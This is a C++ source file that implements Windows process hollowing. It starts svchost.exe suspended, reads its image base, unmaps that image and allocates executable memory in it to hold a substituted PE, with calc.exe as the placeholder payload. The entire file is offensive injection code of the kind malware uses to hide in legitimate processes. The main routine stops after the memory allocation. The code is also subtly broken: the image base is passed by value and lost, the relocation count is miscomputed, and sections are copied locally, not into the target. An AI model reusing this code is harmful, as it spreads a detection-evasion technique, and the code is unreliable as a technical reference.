// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#pragma once
#define DEBUG
#include "ProcessHollowingPE.h"

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent)
{
	HANDLE hPe = NULL;
	hPe = CreateFileA(peName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD peSize = GetFileSize(hPe, NULL);

#ifdef DEBUG
	printf("[+] DLL %s loaded\r\n", peName);
	printf("[+] DLL size: %lu bytes \r\n", peSize);
#endif

	peContent = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, peSize);
	if (peContent == NULL)
	{
#ifdef DEBUG
		printf("[-] ERROR in allocating in HEAP\r\n");
#endif
		return FALSE;
	}
	if (!ReadFile(hPe, peContent, peSize, NULL, NULL))
	{
#ifdef DEBUG
		printf("[-] ERROR copying Dll in HEAP \r\n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Allocating size of Dll on the HEAP @ 0x%p\r\n", peContent);
#endif
	if (!CloseHandle(hPe))
	{
#ifdef DEBUG
		printf("[-] ERROR in closing Handle on file %s", peName);
#endif
		return FALSE;
	}
	return TRUE;
}

bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION pi)
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	if (!CreateProcessA(NULL, processName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi))
	{
		printf("[-] ERROR: Cannot create process %s", processName);
		return FALSE;
	}
	return TRUE;
}

bool getImageBaseAddr(LPVOID destImageBase, HANDLE pHandle)
{
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	ULONG returnLength = 0;

	DWORD NtStatus = 0;

	NtStatus = NtQueryInformationProcess(pHandle, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (NtStatus != 0)
	{
		printf("[-] ERROR: Cannot get information on target process. ERROR code: %x\r\n", NtStatus);
		return FALSE;
	}
	DWORD64 imageBaseAddrOffset = (DWORD64) pbi->PebBaseAddress + 0x10;

	SIZE_T bytesRead = NULL;

	if (!ReadProcessMemory(pHandle, (LPCVOID)imageBaseAddrOffset, &destImageBase, sizeof(LPVOID), &bytesRead))
	{
		printf("[-] ERROR: Cannot read target process memory\r\n");
		return FALSE;
	}
	printf("[*] Getting image base address of target process: %p\r\n", destImageBase);
	return TRUE;

}

bool retrieveNtHeaders(PIMAGE_NT_HEADERS& ntHeaders, LPVOID peContent)
{
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent;
    if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
    {
#ifdef DEBUG
        printf("[-] ERROR: Input file seems to not be a PE\r\n");
#endif
        return FALSE;
    }
    ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosHeaders + dosHeaders->e_lfanew);

#ifdef DEBUG
    printf("[*] Dos Header: %x\r\n", dosHeaders->e_magic);
    printf("[*] NT headers: %p\r\n", ntHeaders);
#endif

    return TRUE;

}

bool copyPESections(LPVOID pImage, LPVOID peContent, PIMAGE_NT_HEADERS ntHeaders)
{
    PIMAGE_SECTION_HEADER peSection = NULL;
    LPVOID sectionDest = NULL;
    LPVOID sectionContent = NULL;
    peSection = IMAGE_FIRST_SECTION(ntHeaders);

    for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {

        sectionDest = (LPVOID)((DWORD_PTR)pImage + (DWORD_PTR)peSection->VirtualAddress);

#ifdef DEBUG
        printf("[*] Section Name: %s\r\n", peSection->Name);
        printf("[*] Copy section number %lu: VirtualAddress %p -> Real Address: %p with size of %lu bytes\r\n", i, (LPVOID)peSection->VirtualAddress, (LPVOID)sectionDest, peSection->SizeOfRawData);
#endif

        sectionContent = (LPVOID)((DWORD_PTR)peContent + (DWORD_PTR)peSection->PointerToRawData);
        std::memcpy(sectionDest, sectionContent, peSection->SizeOfRawData);
        DWORD oldProtects = 0;
        if (!strcmp((char*)peSection->Name, ".text"))
        {
#ifdef DEBUG
            printf("[+] Changing permission to RX on %s section\r\n", (char*)peSection->Name);
#endif
            if (!VirtualProtect(sectionDest, peSection->SizeOfRawData, PAGE_EXECUTE_READ, &oldProtects))
            {
#ifdef DEBUG
                printf("[-] Failed in changing permissions on %s section to EXECUTE_READ\r\n", (char*)peSection->Name);
#endif
                return FALSE;
            }
        }
        peSection++;
    }

    return  TRUE;
}

bool imageBaseRelocations(LPVOID pImage, PIMAGE_NT_HEADERS ntHeaders)
{
    IMAGE_DATA_DIRECTORY relocationTable = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR pRelocationTable = relocationTable.VirtualAddress + (DWORD_PTR)pImage;
    DWORD_PTR deltaImageBase = (DWORD_PTR)pImage - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
    DWORD currentRelocation = 0;

#ifdef DEBUG
    printf("[*] Get relocation table Virtual Address: %p, Real Address: %p\r\n", (LPVOID)relocationTable.VirtualAddress, (LPVOID)pRelocationTable);
    printf("[*] Number of relocations %lu\r\n", relocationTable.Size);
    printf("[*] Size of BASE_RELOCATION_BLOCK %llu\r\n", sizeof(BASE_RELOCATION_BLOCK));
#endif

    PBASE_RELOCATION_BLOCK relocationBlock = NULL;

    while (currentRelocation < relocationTable.Size)
    {
#ifdef DEBUG
        printf("[*] Current relocation %lu\r\n", currentRelocation);
#endif

        relocationBlock = (PBASE_RELOCATION_BLOCK)(pRelocationTable + currentRelocation);
        currentRelocation += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY));

#ifdef DEBUG
        printf("[*] Number of relocations for this block: %lu\r\n", relocationsCount);
#endif

        PBASE_RELOCATION_ENTRY relocEntry = (PBASE_RELOCATION_ENTRY)(pRelocationTable + currentRelocation);

        for (DWORD i = 0; i < relocationsCount; i++)
        {
            currentRelocation += sizeof(BASE_RELOCATION_ENTRY);
            if (relocEntry[i].Type == 0)
                continue;

            DWORD_PTR blockRVA = relocationBlock->PageAddress + relocEntry[i].Offset;
            DWORD_PTR addressToPatch = 0;

            if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD_PTR)pImage + blockRVA), &addressToPatch, sizeof(DWORD_PTR), NULL))
            {
#ifdef DEBUG
                printf("[-] Error in reading current process memory at address: %p\r\n", (LPVOID)((DWORD_PTR)pImage + blockRVA));
#endif
                return FALSE;
            }

#ifdef DEBUG
            printf("[*] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)addressToPatch, (VOID*)(addressToPatch + deltaImageBase));
#endif

            addressToPatch += deltaImageBase;
            std::memcpy((PVOID)((DWORD_PTR)pImage + blockRVA), &addressToPatch, sizeof(DWORD_PTR));
        }
    }
    return TRUE;
}


int main()
{
	
	

	// create destination process - this is the process to be hollowed out

	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	
	LPCSTR peInject = "C:\\Windows\\System32\\calc.exe";
	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";

	if (!launchSusprendedProcess((LPSTR)target, pi))
		exit(1);

	HANDLE pHandle = pi->hProcess;
	LPVOID imageBaseAddr = NULL;

	if (!getImageBaseAddr(imageBaseAddr, pHandle))
		exit(1);

	LPVOID peContent = NULL;
	if (!loadPEFromDisk(peInject, peContent))
		exit(1);

	PIMAGE_NT_HEADERS ntHeaders = NULL;

	if (!retrieveNtHeaders(ntHeaders, peContent))
		exit(1);

	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(pHandle, imageBaseAddr);

	LPVOID newImageBaseAddr = VirtualAllocEx(pHandle, imageBaseAddr, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (newImageBaseAddr == NULL)
	{
		printf("[-] ERROR: Cannot allocate memory on the target process\r\n");
		exit(1);
	}


	

	return 0;
}
